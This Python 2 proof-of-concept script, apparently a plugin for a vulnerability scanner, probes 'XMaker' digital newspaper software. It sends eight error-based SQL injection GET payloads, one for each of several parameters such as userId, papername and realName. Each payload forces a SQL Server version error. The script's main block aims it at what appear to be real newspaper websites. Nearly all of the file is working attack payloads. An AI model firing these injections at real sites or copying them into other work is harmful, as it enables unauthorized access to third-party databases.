#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  : XMaker数字报纸通用型get注入漏洞 8 处
Author    :  a
mail      :  a@lcx.cc
 
"""
import urlparse

def assign(service, arg):
    if service == 'xplus':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    ps = ["www/index.php?mod=admin&con=subscribe&act=unsubscribe&subsId=1&userId=1%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--&papers_cn=aaaaaaaa&papers_en=xxxxxxxx" ,# userId参数存在报错注入
          'www/index.php?mod=index&con=index&act=img1&papername=\'%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--',
        'www/index.php?mod=admin&con=deliver&title=1\'%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--&content=&phone=&haveImage=&adopt=&startDate=&endDate=&submit=+%CB%D1+%CB%F7+ ' ,
        'www/index.php?mod=admin&con=review&act=view&id=123456\'%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--', # id参数存在注入
        'www/index.php?mod=admin&con=review&content=1\'%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--', # content参数存在注入
        'www/index.php?mod=admin&con=user&realName=\'%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--' ,   # realName参数存在注入
        'www/index.php?mod=admin&con=Subscribe&act=unsubscribeList&reason=1\'%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--' ,  #reson参数存在注入
        'www/index.php?mod=index&con=Review&act=gettitle&aid=1%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--' #aid参数存在注入
        ]
    for p in ps:
        url = arg + p
        #print url
        code2, head, res, errcode, _ = curl.curl2(url )
       # print res
        if (code2 ==200) and  ('ODBC SQL Server Driver' in res) and ('SQLExecute' in res) and ('GAO JI' in res):
             security_hole(url)

if __name__ == '__main__':
    from dummy import *
    #audit(assign('xplus', 'http://smrb.smnet.com.cn')[1])
    audit(assign('xplus', 'http://news.xd56b.com')[1])